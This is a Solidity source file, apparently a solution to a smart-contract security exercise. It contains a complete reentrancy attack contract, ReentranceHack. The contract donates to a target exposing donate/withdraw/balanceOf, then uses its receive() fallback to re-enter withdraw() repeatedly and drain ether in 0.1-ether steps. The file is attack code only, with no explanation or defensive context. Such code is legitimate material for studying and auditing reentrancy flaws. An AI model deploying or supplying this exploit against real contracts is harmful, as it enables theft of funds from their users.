// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256);

    function donate(address _to) external payable virtual;

    function withdraw(uint256 _amount) external virtual;
}

contract ReentranceHack {
    address payable _target;
    IReentrance targetContract;

    event Withdraw();
    event RemainingBalance(uint256 bal);

    constructor(address target) {
        _target = payable(target);
        targetContract = IReentrance(target);
    }

    function attack() public payable {
        (bool success, ) = address(targetContract).call{value: msg.value}(
            abi.encodeWithSelector(
                targetContract.donate.selector,
                address(this)
            )
        );
        _withdrawAll(0.1 ether);
    }

    function _withdrawAll(uint256 amt) internal {
        targetContract.withdraw(amt);
        emit Withdraw();
        emit RemainingBalance(targetContract.balanceOf(address(this)));
    }

    receive() external payable {
        uint256 remaining = targetContract.balanceOf(address(this));
        if (remaining > 0.1 ether) {
            _withdrawAll(0.1 ether);
        } else {
            _withdrawAll(remaining);
        }
    }
}
